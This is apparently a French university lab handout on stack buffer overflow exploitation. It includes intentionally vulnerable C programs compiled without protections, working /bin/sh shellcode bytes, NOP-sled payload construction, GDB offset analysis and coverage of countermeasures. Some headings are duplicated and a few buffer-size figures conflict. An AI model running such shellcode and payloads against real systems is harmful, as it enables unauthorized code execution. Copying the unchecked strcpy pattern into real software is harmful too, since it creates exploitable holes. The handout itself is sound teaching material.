# TP : Exploitation de Buffer Overflow
## Master 2 - Sécurité Informatique

### Objectifs pédagogiques
À l'issue de ce TP, les étudiants seront capables de :
- Comprendre le fonctionnement de la pile (stack) en mémoire
- Identifier et analyser une vulnérabilité de type buffer overflow
- Exploiter cette vulnérabilité pour exécuter du code arbitraire
- Utiliser des outils de débogage (GDB) pour analyser l'exécution d'un programme
- Maîtriser les concepts de shellcode, NOP sledding et redirection du flux d'exécution

### Prérequis
- Notions d'assembleur x86
- Compréhension de base de la gestion mémoire
- Familiarité avec l'environnement Linux
- Bases du langage C

### Environnement de travail
- Distribution Linux (Ubuntu/Debian recommandé)
- GCC pour la compilation
- GDB pour le débogage
- Désactivation de l'ASLR : `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
- Compilation sans protections : `-fno-stack-protector -z execstack -no-pie`

---

## Partie I : Rappels théoriques (30 min)

### 1.1 La pile (stack) en mémoire

**Schéma 1 : Structure générale de la pile**
```
Adresses hautes
    │
    ▼
┌─────────────────┐
│  Arguments      │  ← argv, argc
├─────────────────┤
│  Variables env. │  ← Variables d'environnement
├─────────────────┤
│     PILE        │  ← Stack (croît vers le bas)
│                 │
│  ┌───────────┐  │
│  │ Frame n   │  │  ← Fonction courante
│  ├───────────┤  │
│  │ Frame n-1 │  │  ← Fonction appelante
│  └───────────┘  │
│                 │
└─────────────────┘
    ▲
    │
Adresses basses
```

**Question 1.1.1** : Expliquez le rôle de la pile dans l'exécution d'un programme. Quels registres sont impliqués ?
- **ESP** (Stack Pointer) : Pointe vers le sommet de la pile
- **EBP** (Base Pointer) : Pointe vers la base du frame de fonction courant
- **EIP** (Instruction Pointer) : Contient l'adresse de la prochaine instruction

**Question 1.1.2** : Décrivez ce qui se passe lors de l'appel d'une fonction :

**Schéma 2 : Stack frame lors d'un appel de fonction**
```
ESP avant appel  →  ┌─────────────────┐
                   │   Paramètre 1   │  ← Argument de la fonction
                   ├─────────────────┤
                   │   Paramètre 2   │  ← Autres arguments
                   ├─────────────────┤
ESP après call   → │ Adresse retour  │  ← EIP sauvegardé (instruction après call)
                   ├─────────────────┤
                   │   EBP ancien    │  ← EBP sauvegardé (push ebp)
EBP nouveau      → ├─────────────────┤
                   │ Variables loc.  │  ← char buffer[64]
                   │                 │
ESP après alloc  → ├─────────────────┤
                   │   Espace libre  │
                   └─────────────────┘
```

Étapes :
1. **Push des paramètres** sur la pile (de droite à gauche)
2. **CALL** : sauvegarde automatique d'EIP et saut vers la fonction
3. **Push EBP** : sauvegarde du frame pointer de la fonction appelante
4. **MOV EBP, ESP** : établissement du nouveau frame
5. **SUB ESP, taille** : allocation d'espace pour les variables locales

### 1.2 Vulnérabilité Buffer Overflow

**Question 1.2.1** : Qu'est-ce qu'un buffer overflow ? Donnez un exemple de fonction C vulnérable.

**Schéma 3 : Buffer overflow - État normal vs débordement**

**État normal (input < buffer size) :**
```
EBP sauvegardé  → ┌─────────────────┐
                  │   0xbffffc68    │  ← Ancien EBP
                  ├─────────────────┤
EIP sauvegardé  → │   0x08048446    │  ← Adresse de retour
                  ├─────────────────┤
                  │      buffer     │
EBP courant     → ├─────────────────┤  ← char buffer[64]
                  │ "AAAA"  (input) │  ← strcpy(buffer, input)
                  │                 │
                  │   (espace libre)│
 ESP            → └─────────────────┘
```

**État avec buffer overflow (input > buffer size) :**
```
EBP sauvegardé  → ┌─────────────────┐
                  │   0x41414141    │  ← EBP écrasé par 'AAAA'
                  ├─────────────────┤
EIP sauvegardé  → │   0x41414141    │  ← EIP écrasé par 'AAAA' !
                  ├─────────────────┤
                  │      buffer     │
EBP courant     → ├─────────────────┤
                  │ "AAAA...AAAA"   │  ← Input trop long
                  │ "AAAA...AAAA"   │  ← Déborde du buffer
                  │ "AAAA...AAAA"   │  ← Écrase EBP et EIP
 ESP            → └─────────────────┘
```

**Conséquence** : Au moment du `RET`, le processeur tente d'aller à l'adresse 0x41414141 → **SEGFAULT** !

**Question 1.2.2** : Pourquoi `strcpy()` est-elle dangereuse ? Quelles sont les alternatives sécurisées ?

**Fonctions dangereuses :**
- `strcpy()` → utiliser `strncpy()` ou `strlcpy()`
- `strcat()` → utiliser `strncat()` ou `strlcat()`
- `sprintf()` → utiliser `snprintf()`
- `gets()` → utiliser `fgets()`

---

## Partie II : Analyse statique (45 min)

### 2.1 Premier programme vulnérable

Créez le fichier `vuln1.c` :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[64];
    strcpy(buffer, arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) {
        printf("Usage: %s <string>\n", argv[0]);
        return 1;
    }
    func(argv[1]);
    return 0;
}
```
```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install gcc-multilib libc6-dev-i386
```

**Question 2.1.1** : Compilez le programme avec les options de sécurité désactivées :
```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vuln1 vuln1.c
```
| Option                 | Signification                                                                                                                                                                             |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-fno-stack-protector` | **Désactive la protection de la pile** (stack canary), ce qui rend le binaire vulnérable aux attaques de type **buffer overflow**.                                                        |
| `-z execstack`         | **Rend la pile exécutable**. Cela permet d'exécuter du code injecté sur la pile (comme un shellcode).                                                                                     |
| `-no-pie`              | **Désactive la génération de binaire PIE (Position Independent Executable)**. L'adresse de base du programme est fixe, ce qui facilite l’exploitation, car les adresses sont prévisibles. |
| `-o vuln1`             | Spécifie le nom de l’exécutable final.                                                                                                                                                    |
| `vuln1.c`              | Le fichier source à compiler.                                                                                                                                                             |



**Question 2.1.2** : Testez le programme avec différentes tailles d'entrée :
- `./vuln1 "ABC"`
- `./vuln1 $(perl -e 'print "A"x50')`
- `./vuln1 $(perl -e 'print "A"x100')`

Que observez-vous ?

### 2.2 Analyse du code assembleur

**Question 2.2.1** : Utilisez GDB pour analyser le code assembleur :
```bash
gdb ./vuln1
(gdb) disass main
(gdb) disass func
```

**Question 2.2.2** : Dans la fonction `func`, identifiez :
- L'instruction d'allocation du buffer
- L'appel à `strcpy`
- L'instruction de retour

**Question 2.2.3** : Calculez la taille réellement allouée pour le buffer (incluant l'alignement mémoire).

---

## Partie III : Analyse dynamique avec GDB (60 min)

### 3.1 Points d'arrêt stratégiques

**Question 3.1.1** : Placez des breakpoints aux endroits suivants et justifiez leur utilité :
```bash
(gdb) break *0x[adresse_avant_call_func]    # Avant appel func
(gdb) break *0x[adresse_debut_func]         # Début de func
(gdb) break *0x[adresse_apres_allocation]   # Après allocation buffer
(gdb) break *0x[adresse_apres_strcpy]       # Après strcpy
(gdb) break *0x[adresse_avant_ret]          # Avant retour
```

### 3.2 Observation de l'état de la pile

**Question 3.2.1** : Exécutez le programme avec un argument de 78 caractères :
```bash
(gdb) run $(perl -e 'print "A"x78')
```

### 3.2 Observation de l'état de la pile

**Question 3.2.1** : Exécutez le programme avec un argument de 78 caractères :
```bash
(gdb) run $(perl -e 'print "A"x78')
```

**Question 3.2.2** : À chaque breakpoint, observez :

**Schéma de référence - État de la pile pendant l'exécution :**
```
Breakpoint 1 (avant call func) :
ESP → ┌─────────────────┐ ← 0xbffffc50
      │   0xbffffe35    │   Pointeur vers argv[1] ("AAA...") 
      ├─────────────────┤
      │   Autres vars   │
      └─────────────────┘

Breakpoint 2 (début func, après push ebp) :
ESP → ┌─────────────────┐ ← 0xbffffc48  
      │   0xbffffc68    │   Ancien EBP (sauvegardé)
      ├─────────────────┤
      │   0x08048446    │   EIP sauvegardé (adresse après call)
      ├─────────────────┤ 
EBP → │   0xbffffe35    │   Pointeur vers notre input
      └─────────────────┘

Breakpoint 3 (après allocation buffer) :
EBP → ┌─────────────────┐ ← 0xbffffc48
      │   0xbffffc68    │   Ancien EBP
      ├─────────────────┤
      │   0x08048446    │   EIP sauvegardé  
      ├─────────────────┤
      │   0xbffffe35    │   Pointeur vers input
      ├─────────────────┤
      │                 │   
      │  Buffer space   │   88 octets alloués (0x58)
      │  (vide pour     │   pour buffer + variables locales
      │   l'instant)    │
      │                 │
ESP → └─────────────────┘ ← 0xbffffbf0

Breakpoint 4 (après strcpy) - AVEC OVERFLOW :
EBP → ┌─────────────────┐ ← 0xbffffc48
      │   0x41414141    │   EBP écrasé par nos 'A' !
      ├─────────────────┤
      │   0x08004141    │   EIP partiellement écrasé !
      ├─────────────────┤
      │   0xbffffe35    │   Pointeur vers input (intact)
      ├─────────────────┤
      │ 0x41414141      │   
      │ 0x41414141      │   Notre buffer rempli de 'A'
      │ 0x41414141      │   (0x41 = 'A' en ASCII)
      │ 0x41414141      │   Déborde et écrase la pile !
      │     ...         │
ESP → └─────────────────┘ ← 0xbffffbf0
```

**Points clés à observer :**
- **Adresse du buffer** : EBP - 0x48 = début du buffer  
- **Taille réelle** : 0x58 (88) octets alloués par le compilateur
- **Décalage EIP** : 76 octets pour atteindre l'adresse de retour
- **Écrasement** : Nos 78 'A' écrasent EBP et 2 octets d'EIP

**Question 3.2.3** : Identifiez précisément :
- L'adresse de début du buffer
- L'adresse de la sauvegarde d'EBP
- L'adresse de la sauvegarde d'EIP
- Le décalage nécessaire pour écraser EIP

### 3.3 Calcul des offsets

**Question 3.3.1** : Déterminez combien d'octets sont nécessaires pour :
- Remplir le buffer
- Écraser la sauvegarde d'EBP
- Atteindre la sauvegarde d'EIP

**Question 3.3.2** : Vérifiez vos calculs en testant avec une chaîne de taille précise.

---

## Partie IV : Exploitation - Cas 1 (Buffer suffisant) (90 min)

### 4.1 Préparation du shellcode

Le shellcode suivant ouvre un shell :
```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```

**Question 4.1.1** : Quelle est la taille de ce shellcode ?

**Question 4.1.2** : Ce shellcode peut-il tenir dans votre buffer ? Justifiez.

### 4.2 Construction du payload

### 4.2 Construction du payload

**Question 4.2.1** : Construisez votre payload selon le schéma :

**Schéma 4 : Payload pour exploitation - Cas 1 (Buffer suffisant)**
```
Buffer (72 octets dans la pile)
├─────────────────────────────────────────────────────────────────────┤

NOP Sled (31 octets)          Shellcode (45 octets)    Nouvelle adresse EIP
┌────────────────────┐     ┌─────────────────────┐    ┌─────────────────┐
│ \x90\x90\x90...   │ --> │ \xeb\x1f\x5e...     │    │ 0xbffffc10     │
│ (31 x \x90)       │     │ /bin/sh             │    │ (Little Endian) │
└────────────────────┘     └─────────────────────┘    └─────────────────┘
         │                           │                         │
         │                           │                         │
         ▼                           ▼                         ▼
┌─────────────────┬─────────────────┬─────────────────┬─────────────────┐
│       NOP       │    Shellcode    │     sEBP        │      sEIP       │
│   Instructions  │   Instructions  │   (écrasé)      │   (contrôlé)    │
└─────────────────┴─────────────────┴─────────────────┴─────────────────┘
                                                              │
                                                              │
                                                              ▼
                                    Pointe vers le milieu du NOP sled
                                    
État de la pile lors de l'exécution :
┌─────────────────┐ ← 0xbffffc00
│ \x90 \x90 \x90  │   Instructions NOP
├─────────────────┤ ← 0xbffffc10 ← EIP pointe ici
│ \x90 \x90 \x90  │   Plus de NOPs
├─────────────────┤ ← 0xbffffc1f
│ \xeb \x1f \x5e  │   Début du shellcode
├─────────────────┤
│ Instructions    │   Suite du shellcode
│ du shellcode    │
├─────────────────┤
│ /bin/sh\x00     │   Fin du shellcode
└─────────────────┘
```

**Principe du NOP Sledding :**
1. **EIP** pointe vers 0xbffffc10 (milieu des NOPs)
2. **Exécution** des NOPs successifs (ne font rien)
3. **Arrivée** naturelle au shellcode
4. **Exécution** du shellcode → Shell !

Calculez :
- **Taille du buffer** : 72 octets (analysé avec GDB)
- **Taille pour écraser EBP** : 4 octets supplémentaires = 76 octets total
- **Shellcode** : 45 octets
- **NOPs nécessaires** : 76 - 45 = 31 NOPs
- **Adresse cible** : Milieu du NOP sled pour plus de flexibilité

**Question 4.2.2** : Implémentez le payload en Perl :
```perl
perl -e 'print "\x90"x[NB_NOPS] . "[SHELLCODE]" . "[ADRESSE]"'
```

### 4.3 Test de l'exploitation

**Question 4.3.1** : Testez votre payload dans GDB :
```bash
(gdb) run $(perl -e 'print "[VOTRE_PAYLOAD]"')
```

**Question 4.3.2** : Si l'exploitation échoue, analysez :
- L'adresse de retour utilisée
- L'alignement du shellcode
- La présence de caractères problématiques

**Question 4.3.3** : Une fois le shell obtenu dans GDB, testez en dehors :
```bash
./vuln1 $(perl -e 'print "[VOTRE_PAYLOAD]"')
```

---

## Partie V : Exploitation - Cas 2 (Buffer insuffisant) (90 min)

### 5.1 Nouveau programme

Créez `vuln2.c` avec un buffer de 8 octets seulement :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[8];
    strcpy(buffer, arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) {
        printf("Usage: %s <string>\n", argv[0]);
        return 1;
    }
    func(argv[1]);
    return 0;
}
```

**Question 5.1.1** : Compilez avec les mêmes options que précédemment.

**Question 5.1.2** : Le shellcode peut-il tenir dans ce buffer ? Quelle stratégie adopter ?

### 5.2 Nouvelle stratégie d'exploitation

### 5.2 Nouvelle stratégie d'exploitation

**Question 5.2.1** : Analysez le code assembleur pour déterminer :
- La taille réelle du buffer alloué
- Le décalage pour atteindre EIP

**Question 5.2.2** : Construisez un payload selon le schéma :

**Schéma 5 : Payload pour exploitation - Cas 2 (Buffer insuffisant)**
```
Buffer trop petit (16 octets seulement)
├─────────────────────────────┤

Padding (20 octets)     Adresse vers shellcode    Shellcode (45 octets)
┌─────────────────────┐ ┌─────────────────────┐ ┌─────────────────────┐
│ "AAAAAAAAAAAAAAAAA"  │ │    0xbffffc50      │ │ \xeb\x1f\x5e...    │
│ (20 x 'A')          │ │   (Little Endian)   │ │ /bin/sh             │
└─────────────────────┘ └─────────────────────┘ └─────────────────────┘
         │                        │                        │
         │                        │                        │
         ▼                        ▼                        ▼
┌─────────────────┬─────────────────┬─────────────────┬─────────────────┐
│     Buffer      │      sEBP       │      sEIP       │   Shellcode     │
│   (écrasé)      │   (écrasé)      │   (contrôlé)    │   Instructions  │
└─────────────────┴─────────────────┴─────────────────┴─────────────────┘
                                            │
                                            │
                                            ▼
                               Pointe vers le début du shellcode

État de la pile lors de l'exploitation :
                                    
ESP au moment de l'appel func → ┌─────────────────┐ ← 0xbffffc4c
                               │   0x08048446    │   Adresse de retour originale
                               ├─────────────────┤ ← 0xbffffc50
                               │ \xeb \x1f \x5e  │   NOTRE SHELLCODE commence ici
                               ├─────────────────┤   ↑
                               │ Instructions    │   │ EIP pointe ici après RET
                               │ du shellcode    │   │
                               ├─────────────────┤
                               │ /bin/sh\x00     │
                               └─────────────────┘
```

**Différences avec le Cas 1 :**
- **Pas de NOP sled** (pas de place dans le buffer)
- **Shellcode placé APRÈS** l'adresse de retour dans la pile
- **Adresse exacte** requise (pas de marge d'erreur)
- **Calcul précis** des offsets nécessaire

**Question 5.2.3** : Déterminez l'adresse où sera placé le shellcode (après l'adresse de retour).

**Calculs pour vuln2 :**
- **Buffer alloué** : 16 octets (0x10 en assembleur)  
- **Pour atteindre EBP** : 16 octets
- **Pour atteindre EIP** : 16 + 4 = 20 octets
- **Shellcode commence à** : ESP + 4 = adresse_EIP + 4 octets

### 5.3 Calcul précis des adresses

**Question 5.3.1** : Utilisez GDB pour déterminer l'adresse exacte de ESP au moment de l'appel de func.

**Question 5.3.2** : Calculez l'adresse où commencera votre shellcode dans la pile.

**Question 5.3.3** : Attention : utilisez une chaîne de test de la même taille que votre payload final pour éviter les décalages !

### 5.4 Exploitation finale

**Question 5.4.1** : Implémentez et testez votre payload pour le cas 2.

**Question 5.4.2** : Comparez les deux méthodes d'exploitation. Quels sont les avantages/inconvénients de chaque approche ?

---

## Partie VI : Analyses et contre-mesures (45 min)

### 6.1 Limitations de l'exploitation

**Question 6.1.1** : Quels caractères peuvent poser problème dans un shellcode ? Pourquoi ?

**Question 6.1.2** : Pourquoi faut-il désactiver l'ASLR pour que l'exploitation fonctionne ?

### 6.2 Protections modernes

### 6.2 Protections modernes

**Question 6.2.1** : Recompilez vos programmes avec les protections activées :
```bash
gcc -fstack-protector-strong vuln1.c -o vuln1_protected
```

**Question 6.2.2** : Testez vos payloads. Que observez-vous ?

**Question 6.2.3** : Recherchez et expliquez le fonctionnement de :

**Schéma 6 : Stack Canaries (Stack Protector)**
```
Sans protection :                    Avec Stack Canary :
┌─────────────────┐                 ┌─────────────────┐
│   EIP sauvé     │ ← Vulnérable    │   EIP sauvé     │ ← Protégé
├─────────────────┤                 ├─────────────────┤  
│   EBP sauvé     │                 │   EBP sauvé     │
├─────────────────┤                 ├─────────────────┤
│                 │                 │ Stack Canary    │ ← Valeur secrète
│     Buffer      │                 │ (ex: 0xdeadbeef)│   ajoutée ici !
│                 │                 ├─────────────────┤
└─────────────────┘                 │                 │
                                    │     Buffer      │
                                    │                 │
                                    └─────────────────┘

En cas d'overflow :                  Détection d'overflow :
┌─────────────────┐                 ┌─────────────────┐
│ 0x41414141 (A)  │ ← Écrasé        │ 0x41414141 (A)  │ ← Écrasé  
├─────────────────┤                 ├─────────────────┤
│ 0x41414141 (A)  │ ← Écrasé        │ 0x41414141 (A)  │ ← Écrasé
├─────────────────┤                 ├─────────────────┤
│ AAAAAAAAAAAAA   │                 │ 0x41414141 (A)  │ ← Canary écrasé !
│ AAAAAAAAAAAAA   │                 ├─────────────────┤   DÉTECTION ici
│ AAAAAAAAAAAAA   │                 │ AAAAAAAAAAAAA   │
└─────────────────┘                 │ AAAAAAAAAAAAA   │
                                    └─────────────────┘
Exploitation réussie                *** stack smashing detected ***
```

**Autres protections :**

**DEP/NX bit (Data Execution Prevention) :**
```
Mémoire avec DEP :
┌─────────────────┐
│    Code (.text) │ ← Lecture + Exécution (RX)
├─────────────────┤
│   Données       │ ← Lecture + Écriture (RW) 
├─────────────────┤
│     Stack       │ ← Lecture + Écriture (RW) - PAS d'exécution !
├─────────────────┤
│     Heap        │ ← Lecture + Écriture (RW) - PAS d'exécution !
└─────────────────┘
```

**ASLR (Address Space Layout Randomization) :**
```
Sans ASLR (adresses fixes) :         Avec ASLR (adresses aléatoires) :
┌─────────────────┐                 ┌─────────────────┐  
│ Stack: 0xbfff   │ ← Toujours ici  │ Stack: 0x7fff   │ ← Change à chaque
├─────────────────┤                 ├─────────────────┤   exécution !
│ Heap: 0x0804    │ ← Prévisible    │ Heap: 0x5651    │ ← Imprévisible  
├─────────────────┤                 ├─────────────────┤
│ Code: 0x0804    │ ← Prévisible    │ Code: 0x5567    │ ← Imprévisible
└─────────────────┘                 └─────────────────┘
```

### 6.3 Bonnes pratiques de programmation

**Question 6.3.1** : Réécrivez la fonction vulnérable en utilisant des fonctions sécurisées.

**Question 6.3.2** : Quels outils de détection statique pourriez-vous utiliser ?

---

## Partie VII : Pour aller plus loin (Bonus)

### 7.1 Techniques avancées

### 7.1 Techniques avancées

**Question 7.1.1** : Recherchez le principe du "Return-to-libc". En quoi diffère-t-il de l'injection de shellcode ?

**Schéma 7 : Comparaison Shellcode vs Return-to-libc**

**Injection de Shellcode (classique) :**
```
┌─────────────────┐
│   EIP modifié   │ ──────┐
├─────────────────┤       │
│   EBP écrasé    │       │
├─────────────────┤       │
│                 │       │ Pointe vers
│   NOP + Shell   │ ←─────┘ le buffer  
│     code        │ ← Code exécuté ici
│                 │
└─────────────────┘

Problème : Stack non-exécutable (NX) → ÉCHEC
```

**Return-to-libc (contournement NX) :**
```
┌─────────────────┐
│ Adresse de      │ ──────┐
│ system()        │       │ Pointe vers du code
├─────────────────┤       │ LÉGITIME (dans libc)
│ Adresse retour  │       │
│ (AAAA ou exit)  │       │
├─────────────────┤       │
│ Pointeur vers   │       │
│ "/bin/sh"       │       │
├─────────────────┤       │
│                 │       │
│ "/bin/sh\x00"   │       │
└─────────────────┘       │
                          │
Libc en mémoire :         │
┌─────────────────┐       │
│  system() { ... │ ←─────┘ Code déjà présent
│    execve(...)  │ ← Exécution légitime
│    ...          │
└─────────────────┘

Résultat : system("/bin/sh") → Shell obtenu !
```

**Question 7.1.2** : Qu'est-ce que la technique ROP (Return-Oriented Programming) ?

**Schéma 8 : ROP (Return-Oriented Programming)**
```
Principe : Chaîner des "gadgets" (fins d'instructions + RET)

Programme en mémoire :          Gadgets trouvés :
┌─────────────────┐            ┌─────────────────┐
│ ...             │            │ 0x0804abcd:     │
│ POP EAX         │ ←─────────→│ POP EAX; RET    │ ← Gadget 1
│ RET             │            ├─────────────────┤
│ ...             │            │ 0x0804beef:     │  
│ MOV [EBX], EAX  │ ←─────────→│ MOV [EBX],EAX;  │ ← Gadget 2
│ ADD ESI, 4      │            │ ADD ESI,4; RET  │
│ RET             │            ├─────────────────┤
│ ...             │            │ 0x0804cafe:     │
│ INT 0x80        │ ←─────────→│ INT 0x80        │ ← Gadget 3
└─────────────────┘            └─────────────────┘

Stack pour ROP :               Exécution :
┌─────────────────┐            1. RET vers gadget 1
│ 0x0804abcd      │ ← RET 1    2. POP EAX (valeur suivante)
├─────────────────┤            3. RET vers gadget 2  
│ 0xdeadbeef      │ ← Valeur   4. MOV [EBX], EAX
├─────────────────┤               ADD ESI, 4
│ 0x0804beef      │ ← RET 2    5. RET vers gadget 3
├─────────────────┤            6. INT 0x80 (syscall)
│ 0x0804cafe      │ ← RET 3
└─────────────────┘

Avantage : Utilise du code existant → Contourne NX
```

### 7.2 Shellcode personnalisé

**Question 7.2.1** : Analysez le shellcode fourni instruction par instruction.

**Question 7.2.2** : Créez un shellcode simple qui affiche "Pwned!" au lieu d'ouvrir un shell.

---

## Rendu attendu

### Format
- Rapport de 15-20 pages maximum
- Code source des programmes et payloads
- Captures d'écran des étapes importantes
- Analyse détaillée des résultats

### Contenu
1. **Introduction** : Présentation du buffer overflow et de ses enjeux
2. **Méthodologie** : Description de votre approche et des outils utilisés
3. **Analyse des programmes** : Code assembleur, calculs d'offsets
4. **Exploitations** : Description détaillée des deux cas avec payloads
5. **Protections** : Analyse des contre-mesures et de leur efficacité
6. **Conclusion** : Synthèse et perspectives

### Évaluation
- Compréhension des concepts (30%)
- Qualité des exploitations (40%)
- Analyse des protections (20%)
- Qualité du rapport (10%)

---

## Ressources complémentaires

- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
- Documentation GDB
- Intel x86 Assembly Language Reference
- OWASP Buffer Overflow Guide

---

## Annexes

### Annexe A : Commandes GDB essentielles

```bash
# Compilation et lancement
gdb ./programme
(gdb) set disassembly-flavor intel    # Syntaxe Intel (plus lisible)

# Analyse statique
(gdb) info functions                  # Liste des fonctions
(gdb) disass main                     # Désassemble main
(gdb) disass func                     # Désassemble func

# Points d'arrêt
(gdb) break main                      # Breakpoint sur fonction
(gdb) break *0x08048441              # Breakpoint sur adresse
(gdb) info breakpoints               # Liste des breakpoints
(gdb) delete 1                       # Supprime breakpoint 1

# Exécution
(gdb) run arg1 arg2                  # Lance avec arguments
(gdb) continue                       # Continue l'exécution
(gdb) step                          # Pas à pas (entre dans fonctions)
(gdb) next                          # Pas à pas (survole fonctions)

# Inspection registres et mémoire
(gdb) info registers                 # Tous les registres
(gdb) i r $eip $esp $ebp            # Registres spécifiques
(gdb) x/24xw $esp                    # 24 mots hex depuis ESP
(gdb) x/s 0xbffffc00                # String à l'adresse
(gdb) x/i $eip                      # Instruction à EIP

# Modification
(gdb) set $eip = 0x08048400          # Change EIP
(gdb) set {int}0xbffffc00 = 0x41414141  # Écrit en mémoire
```

### Annexe B : Shellcode analysis

**Shellcode utilisé dans le TP :**
```assembly
; Analyse du shellcode /bin/sh (45 octets)
\xeb\x1f                    ; jmp 0x1f (saut vers call)
\x5e                        ; pop esi (récupère adresse "/bin/sh")
\x89\x76\x08               ; mov [esi+8], esi (argv[0] = "/bin/sh")
\x31\xc0                   ; xor eax, eax (eax = 0)
\x88\x46\x07               ; mov [esi+7], al (null terminator)
\x89\x46\x0c               ; mov [esi+12], eax (argv[1] = NULL)
\xb0\x0b                   ; mov al, 11 (syscall execve = 11)
\x89\xf3                   ; mov ebx, esi (filename = "/bin/sh")
\x8d\x4e\x08               ; lea ecx, [esi+8] (argv)
\x8d\x56\x0c               ; lea edx, [esi+12] (envp = NULL)
\xcd\x80                   ; int 0x80 (syscall)
\x31\xdb                   ; xor ebx, ebx (exit status = 0)
\x89\xd8                   ; mov eax, ebx (syscall exit = 1)
\x40                       ; inc eax (eax = 1)
\xcd\x80                   ; int 0x80 (syscall)
\xe8\xdc\xff\xff\xff       ; call -36 (retour vers pop esi)
/bin/sh                     ; string "/bin/sh"
```

**Structure en mémoire du shellcode :**
```
Adresse    Contenu           Explication
---------- ----------------- ---------------------------
0x401000   \xeb\x1f         JMP vers call instruction
0x401002   \x5e             POP ESI ← Point d'entrée réel
0x401003   \x89\x76\x08     Préparation argv[0]
...        ...              Suite des instructions
0x40101C   \xe8\xdc\xff...  CALL -36 (vers 0x401002)
0x401021   "/bin/sh\x00"    String utilisée par execve
```

### Annexe C : Calculs d'offsets

**Méthode systématique pour trouver les offsets :**

1. **Pattern de De Bruijn (optionnel)** :
```bash
# Générer un pattern unique
python -c "from pwn import *; print(cyclic(100))"
# Résultat : aaaabaaacaaadaaa...

# Après crash, identifier l'offset
python -c "from pwn import *; print(cyclic_find(0x61616161))"
```

2. **Méthode manuelle** :
```bash
# Test avec taille croissante
./vuln1 $(perl -e 'print "A"x70')   # Pas de crash
./vuln1 $(perl -e 'print "A"x80')   # Crash
./vuln1 $(perl -e 'print "A"x76')   # Test précis
```

3. **Analyse avec GDB** :
```bash
# Breakpoint avant strcpy
(gdb) break *0x08048407
(gdb) run $(perl -e 'print "A"x76')
(gdb) x/24xw $esp
# Observer l'adresse du buffer et calculer l'offset vers EIP
```

### Annexe D : Variations du shellcode

**Shellcode alternatif (execve sans exit) :**
```assembly
; 25 octets seulement
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

**Shellcode pour afficher "Pwned!" :**
```assembly
; write(1, "Pwned!\n", 7)
\x31\xc0\x31\xdb\x31\xc9\x31\xd2
\xeb\x0f\x5e\xb3\x01\xb1\x07\xb2\x07
\xb0\x04\xcd\x80\xb0\x01\xcd\x80
\xe8\xec\xff\xff\xff\x50\x77\x6e\x65\x64\x21\x0a
```

### Annexe E : Contre-mesures et contournements

**Tableau récapitulatif :**

| Protection | Objectif | Contournement | Difficulté |
|------------|----------|---------------|------------|
| **Stack Canaries** | Détecter l'écrasement de pile | Brute force, info leak | Moyenne |
| **DEP/NX** | Empêcher exécution sur pile | Return-to-libc, ROP | Élevée |
| **ASLR** | Randomiser les adresses | Info leak, brute force | Élevée |
| **FORTIFY_SOURCE** | Vérifications à la compilation | Trouver d'autres fonctions | Faible |
| **PIE** | Randomiser le code | Info leak + ROP | Très élevée |
| **RELRO** | Protection GOT/PLT | Attaquer avant init | Élevée |

### Annexe F : Outils et ressources

**Outils d'analyse :**
```bash
# Vérification des protections
checksec --file binary

# Analyse statique
objdump -d binary
readelf -a binary
strings binary

# Recherche de gadgets ROP
ROPgadget --binary binary
ropper --file binary

# Débogage avancé
gdb-peda           # Extensions GDB
pwndbg            # Interface moderne pour GDB
```

**Ressources complémentaires :**
- [Phrack Magazine - Smashing The Stack](http://phrack.org/issues/49/14.html)
- [LiveOverflow - Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [OWASP - Buffer Overflow](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- [Corelan Team - Exploit Writing](https://www.corelan.be/index.php/articles/)

### Annexe G : Exemple de rapport type

**Structure recommandée pour le rendu :**

```markdown
# Exploitation de Buffer Overflow - Rapport TP

## 1. Introduction et contexte
- Présentation des objectifs
- Environnement de test utilisé
- Outils employés

## 2. Analyse des programmes vulnérables
### 2.1 Analyse statique
- Code source commenté
- Analyse du code assembleur
- Identification des vulnérabilités

### 2.2 Analyse dynamique
- Observation avec GDB
- Calculs d'offsets
- Screenshots des étapes clés

## 3. Exploitations réalisées
### 3.1 Cas 1 - Buffer suffisant
- Construction du payload
- Justification des choix techniques
- Résultats obtenus

### 3.2 Cas 2 - Buffer insuffisant  
- Adaptation de la stratégie
- Calculs d'adresses précis
- Exploitation réussie

## 4. Protections et contournements
- Test des protections modernes
- Analyse de l'efficacité
- Techniques de contournement étudiées

## 5. Conclusion et perspectives
- Synthèse des apprentissages
- Réflexions sur la sécurité
- Pistes d'approfondissement
```

---

**Note importante :** Ce TP est exclusivement destiné à l'apprentissage dans un cadre pédagogique contrôlé. Les techniques enseignées ne doivent être utilisées que sur des systèmes dont vous êtes propriétaire ou avec autorisation explicite.
